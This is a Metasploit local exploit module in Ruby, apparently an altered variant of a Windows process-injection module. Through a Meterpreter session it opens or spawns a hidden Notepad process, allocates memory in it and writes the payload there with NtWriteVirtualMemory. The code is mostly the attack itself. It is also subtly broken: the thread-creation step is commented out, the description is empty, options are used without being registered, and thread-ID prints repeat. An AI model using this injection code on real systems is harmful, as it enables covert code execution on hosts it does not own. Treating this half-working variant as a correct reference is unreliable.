##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Memory Payload Injection (Variant)',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'sinn3r'
        ],
        'Platform' => [ 'win' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [ [ 'Windows', { 'Arch' => [ARCH_X86, ARCH_X64] } ] ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2011-10-12',
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_railgun_memread
            ]
          }
        },
        'Payload'        => {
          'Space'        => 4096,
          'DisableNops'  => true
        }
      )
    )

    register_options(
      [
        OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload. 0=New Process', 0]),
      ]
    )
  end

  # Run Method for when run command is issued
  def exploit
    proc = get_proc(datastore['PID'])
    if not proc
      print_error("Unable to get a proper PID")
      return
    end

    print_status("Injecting payload into #{proc.pid}")

    inject_into_pid(proc)
  end

  # Figures out which PID to inject to
  def get_proc(pid)
    if pid == 0
      notepad_pathname = get_notepad_pathname(ARCH_X64, client.sys.config.getenv('windir'), client.arch)
      vprint_status("Starting  #{notepad_pathname}")
      proc = client.sys.process.execute(notepad_pathname, nil, {
        'Hidden' => datastore['HIDDEN'],
        'ParentPid' => datastore['PPID']
      })
      if proc.nil?
        print_bad("Failed to start notepad process")
      else
        print_status("Spawned Notepad process #{proc.pid}")
      end
    else
      if not has_pid?(pid)
        print_error("Process #{pid} was not found")
        return nil
      end
      proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      if proc.nil?
        print_bad("Failed to start notepad process")
      else
        print_status("Opening existing process #{proc.pid}")
      end
    end
    return proc
  end

  class ObjectAttributes_64 < BinData::Record
    endian :little

    uint32 :my_length
    uint32 :pad0
    uint64 :root_directory
    uint64 :object_name
    uint32 :attributes
    uint32 :pad1
    uint64 :security_descriptor
    uint64 :security_quality_of_service
  end

  def inject_into_pid(proc)
    vprint_status("Performing Architecture Check")

    result = session.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS, false, proc.pid)
    fail_with(Failure::Unknown, 'Failed to open a handle to the process') unless result['GetLastError'] == ::WindowsError::Win32::ERROR_SUCCESS

    handle = result['return']
    print_status('Opened a handle to the process')

    shell_addr = proc.memory.allocate(4096)
    print_status("Allocated memory at 0x#{shell_addr.to_s(16).rjust(16, '0')}")

    session.railgun.add_function(
      'ntdll',
      'NtWriteVirtualMemory',
      'DWORD',
      [
        ['HANDLE', 'ProcessHandle', 'in'],
        ['LPVOID', 'BaseAddress', 'in'],
        ['PBLOB', 'Buffer', 'in'],
        ['SIZE_T', 'NumberOfBytesToWrite', 'in'],
        ['PSIZE_T', 'NumberOfBytesWritten', 'out'],
      ]
    )
    result = session.railgun.ntdll.NtWriteVirtualMemory(handle, shell_addr, payload.encoded, payload.encoded.length, 4)
    print_status("Result: #{result['return']}")
    #
    # session.railgun.add_function(
    #   'ntdll',
    #   'NtCreateThreadEx',
    #   'DWORD',
    #   [
    #     ['PHANDLE', 'hThread', 'out'],
    #     ['DWORD', 'DesiredAccess', 'in'],
    #     ['PBLOB', 'ObjectAttributes', 'in'],
    #     ['HANDLE', 'ProcessHandle', 'in'],
    #     ['LPVOID', 'lpStartAddress', 'in'],
    #     ['LPVOID', 'lpParameter', 'in'],
    #     ['DWORD', 'Flags', 'in'],
    #     ['SIZE_T', 'StackZeroBits', 'in'],
    #     ['SIZE_T', 'SizeOfStackCommit', 'in'],
    #     ['SIZE_T', 'SizeOfStackReserve', 'in'],
    #     ['PBLOB', 'lpBytesBuffer', 'out']
    #   ]
    # )
    # object_attributes = ObjectAttributes_64.new
    # object_attributes.my_length = object_attributes.to_binary_s.size
    # result = session.railgun.ntdll.NtCreateThreadEx(8, GENERIC_ALL, nil, handle, shell_addr, nil, nil, nil, nil, nil, nil)
    # print_status("Result: #{result['return']}")

    print_status("TID: #{session.railgun.kernel32.GetThreadId(-1)['return']}")
    print_status("TID: #{session.railgun.kernel32.GetThreadId(-1)['return']}")
    print_status("TID: #{session.railgun.kernel32.GetThreadId(-1)['return']}")
  end
end
